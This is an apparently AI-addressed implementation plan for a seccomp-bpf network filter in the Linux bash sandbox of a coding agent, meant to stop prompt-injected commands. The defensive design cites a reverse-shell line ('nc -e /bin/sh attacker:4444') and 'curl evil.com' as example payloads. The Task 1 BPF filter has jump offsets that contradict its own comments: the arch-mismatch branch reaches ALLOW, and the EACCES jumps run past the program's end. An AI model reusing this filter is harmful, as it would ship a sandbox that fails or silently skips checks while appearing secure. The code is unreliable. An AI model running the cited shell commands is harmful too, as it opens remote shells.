# Linux Bash Sandbox — Network Filtering (Phase C.1) Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use `superpowers:executing-plans` to implement this plan task-by-task. Each task is one commit. Follow TDD for every task. `zig build test` and `zig fmt --check .` must be green between commits.

**Goal:** Close the network-tunneling gap in the Linux bash sandbox so a prompt-injected `nc -e /bin/sh attacker:4444` cannot reach an external address. The fix is a small seccomp-bpf filter installed by the existing `helper_linux.zig` after Landlock, before `execve`. The filter denies `socket(AF_INET, ...)` and `socket(AF_INET6, ...)` entirely; `AF_UNIX`, `AF_NETLINK`, and other families remain allowed.

**Architecture:** One new module (`src/sandbox/seccomp_linux.zig`) hosting the BPF struct definitions (not in Zig 0.15.2 stdlib) and the filter builder. `helper_linux.zig:run` calls `seccomp_linux.installSocketFamilyFilter()` after `landlock.applyRuleset()` succeeds. The seccomp filter inherits across `execve`, so the bash child gets the restriction.

**Scope note (vs Option B):** This plan implements Option A from the context audit — `socket(AF_INET/AF_INET6) → EACCES`. Loopback TCP/UDP is also blocked as a side effect; `curl localhost:3000` from sandboxed bash fails. AF_UNIX sockets (docker.sock, postgres.sock) still work. The user-hostile loopback loss is the documented tradeoff. Option B (USER_NOTIF supervisor that preserves loopback) is deferred until/unless the loopback loss bites real workflows; the `permissive` opt-out in `config.lua` is the escape hatch for users who need outbound network.

**Tech Stack:** Zig 0.15.2. Raw `seccomp(2)` and `prctl(2)` syscalls via `std.os.linux.syscall*`. No new external deps (no libseccomp link).

---

## Ground Rules

1. TDD every task.
2. One task = one commit.
3. `zig build test` green between commits.
4. `zig fmt --check .` clean before commit.
5. No em dashes anywhere.
6. Plan-citation drift rule: anchor on function names (`installSocketFamilyFilter`, `helper_linux.run`, `landlock.applyRuleset`, `buildLinuxArgv`).
7. Commit footer: `Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>`.
8. **Platform gates:** every change must keep building on macOS. The new seccomp module is Linux-only; gate file inclusion via `if (builtin.os.tag == .linux)` or top-of-file `comptime { if (builtin.os.tag != .linux) @compileError(...); }`.

---

## Pre-flight: facts from context-gathering

- `std.os.linux/seccomp.zig` exposes `MODE`, `SET_MODE_FILTER`, `FILTER_FLAG.TSYNC`, `RET.ERRNO/ALLOW`, `data` struct (`nr`, `arch`, `arg0..arg5`).
- `std.os.linux.PR.SET_NO_NEW_PRIVS = 38` — already set by `landlock_linux.zig` at the `prctl(NO_NEW_PRIVS, 1, ...)` call before `landlock_restrict_self`. Seccomp inherits the same NNP. Single call covers both.
- `std.os.linux.syscalls.seccomp` is per-arch (e.g. 317 on x86_64).
- `AUDIT.ARCH.current` is comptime-resolved per build target — exactly what the BPF `data.arch` check needs.
- **Missing from stdlib:** `sock_filter`, `sock_fprog`, BPF opcode constants (`BPF_LD|BPF_W|BPF_ABS`, `BPF_JMP|BPF_JEQ|BPF_K`, `BPF_RET|BPF_K`). Hand-define these in the new module.
- `socket(2)` signature: `int socket(int domain, int type, int protocol)`. In seccomp.data this lands as `arg0 = domain`. We filter on `arg0 == AF_INET || arg0 == AF_INET6`.
- The bash child inherits the filter via `execve`. Landlock and seccomp both inherit. Order in the helper: `prctl(NNP)` → `landlock_restrict_self` → `seccomp(SET_MODE_FILTER, ...)` → `execve`.

---

## Task 1: Add `src/sandbox/seccomp_linux.zig` with BPF primitives (unused)

**Files:**
- Create: `src/sandbox/seccomp_linux.zig`.
- Modify: nothing else.

### Step 1: Define the BPF struct + opcode constants

The module exports:

```zig
//! Seccomp-BPF wrappers for the bash sandbox helper.
//!
//! Adds a syscall filter that denies socket(AF_INET, ...) and
//! socket(AF_INET6, ...) so prompt-injected commands cannot open
//! outbound IPv4/IPv6 sockets. AF_UNIX, AF_NETLINK, and other families
//! remain unrestricted. Loopback TCP/UDP is blocked as a side effect;
//! AF_UNIX local sockets (docker.sock, psql.sock) still work.
//!
//! Inherits across execve so the bash child enforces the restriction.
//! Installed by `helper_linux.run` after landlock_restrict_self.
//!
//! Hand-rolled BPF; Zig 0.15.2 stdlib has the seccomp namespace
//! but not the classic-BPF struct types or opcode constants.

const std = @import("std");
const builtin = @import("builtin");
const linux = std.os.linux;

comptime {
    if (builtin.os.tag != .linux) @compileError("seccomp_linux is linux-only");
}

/// BPF instruction. Classic-BPF layout (Linux <linux/filter.h>):
///   code: u16  jt: u8  jf: u8  k: u32  (8 bytes total)
pub const SockFilter = extern struct {
    code: u16,
    jt: u8,
    jf: u8,
    k: u32,
};

/// BPF program header passed to seccomp(SET_MODE_FILTER, ...).
pub const SockFprog = extern struct {
    len: u16,
    filter: [*]const SockFilter,
};

// Classic BPF opcodes we use (Linux <linux/bpf_common.h> + <linux/seccomp.h>).
pub const BPF_LD: u16 = 0x00;
pub const BPF_W: u16 = 0x00;
pub const BPF_ABS: u16 = 0x20;
pub const BPF_JMP: u16 = 0x05;
pub const BPF_JEQ: u16 = 0x10;
pub const BPF_K: u16 = 0x00;
pub const BPF_RET: u16 = 0x06;

// Offsets inside `struct seccomp_data` we care about. From
// std.os.linux.seccomp.data layout: nr (i32) at 0, arch (u32) at 4,
// instruction_pointer (u64) at 8, args[6] (u64) starting at 16.
pub const OFFSET_NR: u32 = 0;
pub const OFFSET_ARCH: u32 = 4;
pub const OFFSET_ARG0_LO: u32 = 16; // little-endian low word of args[0]

pub const InstallError = error{
    PrctlFailed,
    SeccompFailed,
};

/// Build the filter program and install it. Caller must have already
/// called `prctl(PR_SET_NO_NEW_PRIVS, 1, ...)` (landlock_linux does this
/// via its own prctl path).
pub fn installSocketFamilyFilter() InstallError!void {
    // Layout pseudo-code:
    //   1. load arch from data.arch
    //   2. jump-if-not-equal to current arch -> KILL (defends against
    //      32/64 multi-arch surprises)
    //   3. load nr from data.nr
    //   4. jump-if-not-equal SYS_socket -> ALLOW (return ALLOW for every
    //      other syscall)
    //   5. load arg0 low-word from data.args[0]
    //   6. jump-if-equal AF_INET -> ERRNO(EACCES)
    //   7. jump-if-equal AF_INET6 -> ERRNO(EACCES)
    //   8. ALLOW
    const arch = @intFromEnum(linux.AUDIT.ARCH.current);
    const sys_socket = @intFromEnum(linux.syscalls.@"socket"); // per-arch number
    const af_inet: u32 = std.posix.AF.INET;
    const af_inet6: u32 = std.posix.AF.INET6;

    const ret_allow: u32 = linux.seccomp.RET.ALLOW;
    const ret_eacces: u32 = linux.seccomp.RET.ERRNO | @as(u32, std.posix.E.ACCES);
    const ret_kill: u32 = linux.seccomp.RET.KILL_PROCESS;

    const filter = [_]SockFilter{
        // 0: A = data.arch
        .{ .code = BPF_LD | BPF_W | BPF_ABS, .jt = 0, .jf = 0, .k = OFFSET_ARCH },
        // 1: if A != arch goto kill
        .{ .code = BPF_JMP | BPF_JEQ | BPF_K, .jt = 0, .jf = 5, .k = arch },
        // 2: A = data.nr
        .{ .code = BPF_LD | BPF_W | BPF_ABS, .jt = 0, .jf = 0, .k = OFFSET_NR },
        // 3: if A != socket goto allow
        .{ .code = BPF_JMP | BPF_JEQ | BPF_K, .jt = 0, .jf = 4, .k = sys_socket },
        // 4: A = data.args[0] low-word
        .{ .code = BPF_LD | BPF_W | BPF_ABS, .jt = 0, .jf = 0, .k = OFFSET_ARG0_LO },
        // 5: if A == AF_INET return EACCES
        .{ .code = BPF_JMP | BPF_JEQ | BPF_K, .jt = 5, .jf = 0, .k = af_inet },
        // 6: if A == AF_INET6 return EACCES
        .{ .code = BPF_JMP | BPF_JEQ | BPF_K, .jt = 4, .jf = 0, .k = af_inet6 },
        // 7: allow
        .{ .code = BPF_RET | BPF_K, .jt = 0, .jf = 0, .k = ret_allow },
        // 8: allow (target of jf at instruction 3)
        .{ .code = BPF_RET | BPF_K, .jt = 0, .jf = 0, .k = ret_allow },
        // 9: eacces (target of jt at instructions 5 and 6)
        .{ .code = BPF_RET | BPF_K, .jt = 0, .jf = 0, .k = ret_eacces },
        // 10: kill (target of jf at instruction 1; protects against
        //     compat-syscall surface in mixed-arch processes)
        .{ .code = BPF_RET | BPF_K, .jt = 0, .jf = 0, .k = ret_kill },
    };

    const prog: SockFprog = .{
        .len = filter.len,
        .filter = &filter,
    };

    // prctl(PR_SET_NO_NEW_PRIVS, 1) — idempotent if landlock already set it
    const nnp = linux.prctl(@intFromEnum(linux.PR.SET_NO_NEW_PRIVS), 1, 0, 0, 0);
    if (linux.E.init(nnp) != .SUCCESS) return error.PrctlFailed;

    // seccomp(SET_MODE_FILTER, FILTER_FLAG_TSYNC, &prog)
    const r = linux.syscall3(
        .seccomp,
        @intFromEnum(linux.seccomp.SET_MODE_FILTER),
        @intFromEnum(linux.seccomp.FILTER_FLAG.TSYNC),
        @intFromPtr(&prog),
    );
    if (linux.E.init(r) != .SUCCESS) return error.SeccompFailed;
}
```

(Adjust constant names to match the exact Zig 0.15.2 stdlib spelling — `linux.seccomp.RET.ALLOW` vs `linux.seccomp.RET_ALLOW`, etc. Confirm via `grep -n "pub const RET" $(zig env | grep std_lib_dir | cut -d'"' -f2)/os/linux/seccomp.zig` before pasting.)

### Step 2: Add inline tests

```zig
test "SockFilter is exactly 8 bytes" {
    try std.testing.expectEqual(@as(usize, 8), @sizeOf(SockFilter));
}

test "filter program builds without panicking" {
    // We can't install (no NNP in test runner) but we can verify the
    // filter array compiles and the constants resolve.
    if (builtin.os.tag != .linux) return error.SkipZigTest;
    // No call to installSocketFamilyFilter here.
    const arch = @intFromEnum(linux.AUDIT.ARCH.current);
    try std.testing.expect(arch != 0);
}
```

### Step 3: Wire into `src/sandbox/mod.zig` if such a facade exists, else just leave the file standalone

`grep -n "sandbox" src/sandbox/*.zig` to confirm.

### Step 4: Run tests

```
zig build test
```

On macOS the file is comptime-excluded by the platform guard, so no build break.

### Step 5: Commit

```bash
git add src/sandbox/seccomp_linux.zig
git commit -m "$(cat <<'EOF'
sandbox: add seccomp_linux module with socket-family filter

Hand-rolled classic-BPF filter for the bash sandbox helper. Denies
socket(AF_INET, ...) and socket(AF_INET6, ...) with EACCES; every
other syscall (and every other socket family) is allowed. AF_UNIX
and AF_NETLINK remain unrestricted so docker.sock, psql.sock, and
nsswitch DNS still function.

Hand-defines sock_filter / sock_fprog and the BPF opcode constants
not present in Zig 0.15.2 stdlib. Uses the existing
std.os.linux.seccomp namespace for RET / SET_MODE_FILTER /
FILTER_FLAG and AUDIT.ARCH.current for build-target arch.

Not yet wired into the helper. Next commit threads the install
call into helper_linux.run after landlock_restrict_self.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 2: Wire `installSocketFamilyFilter` into `helper_linux.run`

**Files:**
- Modify: `src/sandbox/helper_linux.zig`.

### Step 1: Write the failing test

The plan-citation-drift audit noted that `bash.zig`'s "execute denies reading ~/.ssh on Linux" test does NOT actually exercise the helper because Zig's test runner replaces `main()`. The same caveat applies here. The realistic test is a comptime + structural assertion:

```zig
test "helper_linux installs seccomp filter after landlock" {
    if (builtin.os.tag != .linux) return error.SkipZigTest;

    // We cannot invoke run() from a test (it execs into bash). But we can
    // verify the source order: seccomp install happens after landlock and
    // before execTail. This is a comptime structural check via reflection
    // on the source file — pragmatic: not bulletproof, but trips obvious
    // future reorderings.
    //
    // Simpler: just confirm the seccomp module is imported.
    const helper = @import("helper_linux.zig");
    _ = helper; // forces compile-time check that the import chain is valid
    _ = @import("seccomp_linux.zig");
}
```

This is a weak test; the real verification is the manual integration test in Task 4.

### Step 2: Modify `helper_linux.run`

In `src/sandbox/helper_linux.zig`, after the existing `landlock.applyRuleset` call:

```zig
const landlock = @import("landlock_linux.zig");
const seccomp = @import("seccomp_linux.zig");

pub fn run(argv: []const [:0]const u8) noreturn {
    const parsed = parseArgs(argv) catch |err| {
        log.warn("sandbox helper: parseArgs failed ({s}); proceeding unsandboxed", .{@errorName(err)});
        execTail(extractTail(argv));
    };

    landlock.applyRuleset(.{ .cwd = parsed.cwd, .home = parsed.home }) catch |err| {
        log.warn("sandbox helper: landlock unavailable ({s}); proceeding without filesystem isolation", .{@errorName(err)});
        // Continue anyway — seccomp net filter still adds value.
    };

    seccomp.installSocketFamilyFilter() catch |err| {
        log.warn("sandbox helper: seccomp install failed ({s}); proceeding without network filter", .{@errorName(err)});
    };

    execTail(parsed.tail);
}
```

Two semantic notes:

1. Landlock failure is no longer fatal — even if Landlock is missing (very old kernels), seccomp may still install. Conversely, seccomp failure leaves Landlock in place. This is a quiet improvement: today the helper bails on Landlock unsupported and proceeds unsandboxed; after this commit it still installs the seccomp filter.

2. `prctl(NO_NEW_PRIVS)` is the prerequisite for both. `landlock.applyRuleset` already sets it before `landlock_restrict_self`. If landlock failed before NNP was set (e.g., the syscall itself returned ENOSYS at probe time), seccomp's own `prctl` call inside `installSocketFamilyFilter` sets it. Idempotent.

### Step 3: Run tests

```
zig build test
```

The new test should pass. macOS continues to build because `seccomp_linux.zig` is import-only from helper_linux.zig which is itself Linux-gated.

### Step 4: Commit

```bash
git add src/sandbox/helper_linux.zig
git commit -m "$(cat <<'EOF'
sandbox: install seccomp net filter after landlock in helper

helper_linux.run now installs the seccomp socket-family filter
after landlock_restrict_self. The filter denies AF_INET and
AF_INET6 socket() calls, blocking prompt-injected outbound
network including `nc -e attacker:4444`, `curl evil.com`, and
`wget`. AF_UNIX local sockets remain allowed.

Landlock failure is no longer fatal: if Landlock is unavailable
(kernel < 5.13 or disabled), the seccomp filter still installs.
Conversely, seccomp failure leaves Landlock in place.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 3: Update threat-model docstring in `bash.zig`

**Files:**
- Modify: `src/tools/bash.zig` (top-of-file `//!` block).

### Step 1: Update the threat model section

The current docstring has a "Network gap (Linux)" note. Update it:

```zig
//! * Network tunneling: outbound network denied except loopback on macOS;
//!   outbound AF_INET/AF_INET6 socket creation denied entirely on Linux
//!   via seccomp-bpf (closed in Phase C). Loopback TCP/UDP is also denied
//!   on Linux as a side effect of socket-family filtering; AF_UNIX local
//!   sockets (docker.sock, psql.sock) remain allowed. Linux users who
//!   need outbound network can opt out with
//!   zag.set_bash_sandbox_level("permissive").
//!
//! Platform support:
//! * macOS: sandbox-exec with a generated seatbelt profile (see
//!   buildSeatbeltProfile).
//! * Linux: kernel Landlock LSM for filesystem isolation + seccomp-bpf
//!   socket-family filter for network isolation. Installed by a
//!   self-re-exec helper (see sandbox/helper_linux.zig). Kernels < 3.5
//!   or with seccomp disabled fall back to landlock-only with a warning.
//! * Other platforms: unsandboxed with a logged warning.
```

Remove the standalone "Network gap (Linux)" paragraph — the gap is now closed.

### Step 2: Commit

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: update threat model after Linux network filter lands

The Phase C network gap is closed. Linux now blocks AF_INET and
AF_INET6 socket creation via seccomp-bpf. Loopback is also lost as
a side effect; users who need outbound (or local server access)
opt out via zag.set_bash_sandbox_level("permissive").

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 4: Manual integration test instructions + a Linux-only smoke test

**Files:**
- Modify: `src/tools/bash.zig` test block (add a Linux-only smoke test).

### Step 1: Add the smoke test

The existing "execute denies reading ~/.ssh on Linux" test documents that Zig's test runner replaces `main()`. The same caveat applies to network. So the inline test is structural:

```zig
test "Linux sandbox helper imports seccomp module" {
    if (builtin.os.tag != .linux) return error.SkipZigTest;
    // Force the import chain to compile-check.
    const helper = @import("../sandbox/helper_linux.zig");
    const seccomp = @import("../sandbox/seccomp_linux.zig");
    _ = helper;
    _ = seccomp;
}
```

### Step 2: Document the manual integration test

Add a comment block at the bottom of `src/tools/bash.zig` test cluster:

```zig
// Manual integration test (Phase C network filter, Linux only):
//
// On a Linux host:
//   zig build
//   ./zig-out/bin/zag --__sandbox-helper "$PWD" "$HOME" -- /bin/sh -c \
//     'echo test | nc -w 1 1.1.1.1 53 2>&1; echo exit=$?'
//
// Expected: nc reports "Network is unreachable" or "Permission denied",
// shell prints "exit=1" (or whatever nc exits with on EACCES).
//
// Conversely, AF_UNIX still works:
//   ./zig-out/bin/zag --__sandbox-helper "$PWD" "$HOME" -- /bin/sh -c \
//     'echo | socat - UNIX-CONNECT:/var/run/docker.sock 2>&1; echo exit=$?'
//
// Expected: connection refused only if docker isn't running; permission
// granted on the socket() call itself (no EACCES).
//
// Loopback is intentionally also denied (Option A tradeoff):
//   ./zig-out/bin/zag --__sandbox-helper "$PWD" "$HOME" -- /bin/sh -c \
//     'curl -m 1 http://127.0.0.1:80 2>&1; echo exit=$?'
//
// Expected: curl reports "Couldn't connect" because socket(AF_INET) is
// denied before the connect call. Users who need loopback opt out via
// zag.set_bash_sandbox_level("permissive").
```

### Step 3: Commit

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: smoke test + manual integration instructions for net filter

The Zig test runner replaces main() so the --__sandbox-helper
branch never fires under `zig build test`. Add a structural smoke
test that the import chain compiles plus inline documentation for
the manual integration tests Vlad should run on a Linux host.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Plan completion criteria

The plan is done when:

1. Four commits land on `main`.
2. `src/sandbox/seccomp_linux.zig` exists and compiles.
3. `helper_linux.run` calls `seccomp.installSocketFamilyFilter()` after `landlock.applyRuleset()`.
4. `bash.zig` threat model docstring reflects the closed gap.
5. `zig build test` green on macOS and Linux.
6. Manual integration test (Task 4 step 2) verifies on a Linux host: `nc 1.1.1.1` fails with EACCES, AF_UNIX works.

## Estimated scope

- Task 1 (seccomp module + unit tests): ~2 hours, mostly verifying Zig stdlib constant names and confirming the BPF filter logic on first principles.
- Task 2 (wire into helper): ~30 min.
- Task 3 (doc update): ~15 min.
- Task 4 (smoke test + manual instructions): ~30 min.

Total: ~3.5 hours.

## Notes for the executor

- **BPF filter validation is unforgiving.** A misencoded `code` value or a jump offset off by one returns `EINVAL` from `seccomp(SET_MODE_FILTER, ...)`. If the install fails on first try, dump the filter to stderr (`for (filter, 0..) |insn, i| log.debug("[{d}] code=0x{x} jt={d} jf={d} k=0x{x}", ...)`) and cross-reference against the BPF spec.
- **The arch check at instruction 1 is load-bearing.** Without it, a 32-bit syscall on a 64-bit kernel could bypass the filter via compat surface. The `KILL_PROCESS` return on mismatch is the standard OpenSSH/Chromium pattern.
- **Per-arch socket syscall numbers.** `linux.syscalls.@"socket"` is 41 on x86_64, 198 on aarch64, etc. Zig's per-arch enum handles this. Verify by `grep -A2 "pub const socket" $(zig env | grep std_lib_dir | cut -d'"' -f2)/os/linux/syscalls.zig`.
- **`FILTER_FLAG.TSYNC`** synchronizes the filter across all threads of the helper process. The helper has only one thread today, but TSYNC is the canonical idiom and harmless on single-threaded callers.
- **What this DOES NOT block:**
  - `unix:` sockets to `/var/run/docker.sock` etc. (intentional; covered by filesystem rules — the path must be readable).
  - `AF_NETLINK` for DNS (intentional; nsswitch needs it).
  - Already-open inet sockets inherited via env or fd (impossible in normal usage; the helper opens nothing inet).
- **What this DOES block, beyond the threat model:**
  - `curl localhost:3000` — documented loopback loss. Permissive escape hatch is the answer.
  - DNS resolution via `getaddrinfo` if glibc routes it through `AF_INET` UDP rather than nsswitch. Test this manually; if DNS breaks for `nslookup`-style usage inside sandboxed bash, that's the first surprise users will hit. The agent loop itself runs outside the sandbox and is unaffected.
- **Phase C.2 trigger:** if the loopback loss starts biting real workflows (users complaining that `/sandbox curl localhost:8080` is broken), the next plan upgrades to Option B (USER_NOTIF supervisor preserving loopback). Mark this point in `feedback_audit_verify_findings.md` if it happens.
